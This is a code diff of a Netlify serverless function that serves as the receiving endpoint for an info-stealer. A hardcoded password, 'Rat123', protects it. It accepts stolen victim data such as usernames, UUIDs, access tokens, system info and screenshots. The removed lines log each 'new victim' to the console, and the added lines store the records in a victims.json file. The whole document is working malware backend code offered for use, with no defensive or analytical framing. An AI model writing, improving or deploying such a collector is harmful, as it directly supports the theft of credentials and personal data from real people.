@@ -1,6 +1,7 @@
-// Netlify function for handling incoming stealer data
+const { readFileSync, writeFileSync } = require('fs');
+const path = require('path');
+
 exports.handler = async function(event, context) {
-    // Set CORS headers
     const headers = {
         'Access-Control-Allow-Origin': '*',
         'Access-Control-Allow-Headers': 'Content-Type, X-Password',
@@ -8,82 +9,65 @@ exports.handler = async function(event, context) {
         'Content-Type': 'application/json'
     };
 
-    // Handle preflight OPTIONS request
     if (event.httpMethod === 'OPTIONS') {
-        return {
-            statusCode: 200,
-            headers,
-            body: ''
-        };
+        return { statusCode: 200, headers, body: '' };
     }
 
-    // Only accept POST requests
     if (event.httpMethod !== 'POST') {
-        return {
-            statusCode: 405,
-            headers,
-            body: JSON.stringify({ error: 'Method not allowed' })
-        };
+        return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
     }
 
     try {
-        // Parse the request body
         const body = JSON.parse(event.body);
         const { password, data } = body;
 
-        // Check password
         if (password !== "Rat123") {
-            return {
-                statusCode: 401,
-                headers,
-                body: JSON.stringify({ error: 'Unauthorized - Invalid password' })
-            };
+            return { statusCode: 401, headers, body: JSON.stringify({ error: 'Unauthorized' }) };
         }
 
-        // Log the received data (visible in Netlify logs)
-        console.log('=' .repeat(50));
-        console.log('🚨 NEW VICTIM DATA RECEIVED');
-        console.log('=' .repeat(50));
-        console.log('📅 Time:', new Date().toISOString());
-        console.log('👤 Username:', data?.username || 'N/A');
-        console.log('🆔 Victim ID:', data?.victim_id || 'N/A');
-        console.log('🔑 UUID:', data?.uuid || 'N/A');
-        console.log('🎮 Token:', data?.access_token ? 'Present' : 'None');
-        
-        if (data?.system_info) {
-            console.log('💻 System:', data.system_info.os);
-            console.log('👤 User:', data.system_info.user);
-        }
-        
-        if (data?.screenshots) {
-            console.log('📸 Screenshots:', data.screenshots.length);
-        }
-        
-        console.log('📦 Full data:', JSON.stringify(data, null, 2));
-        console.log('=' .repeat(50));
+        // Add timestamp
+        const newData = {
+            ...data,
+            id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
+            timestamp: new Date().toISOString()
+        };
 
-        // Return success response
+        // Try to read existing data
+        let victims = [];
+        try {
+            const dataPath = path.join('/tmp', 'victims.json');
+            const fileData = readFileSync(dataPath, 'utf8');
+            victims = JSON.parse(fileData);
+        } catch (e) {
+            // File doesn't exist yet
+        }
+
+        // Add new data
+        victims.unshift(newData);
+
+        // Save back to file
+        const dataPath = path.join('/tmp', 'victims.json');
+        writeFileSync(dataPath, JSON.stringify(victims, null, 2));
+
+        console.log('✅ Data saved:', newData.username);
+
         return {
             statusCode: 200,
             headers,
             body: JSON.stringify({
                 success: true,
-                message: 'Data received successfully',
+                message: 'Data received',
                 timestamp: new Date().toISOString(),
-                victim_id: data?.victim_id || 'unknown'
+                victim_id: data?.victim_id
             })
         };
 
     } catch (error) {
-        console.error('❌ Error processing request:', error);
-        
+        console.error('Error:', error);
         return {
             statusCode: 500,
             headers,
-            body: JSON.stringify({ 
-                error: 'Internal server error',
-                message: error.message 
-            })
+            body: JSON.stringify({ error: 'Internal error' })
         };
     }
 };
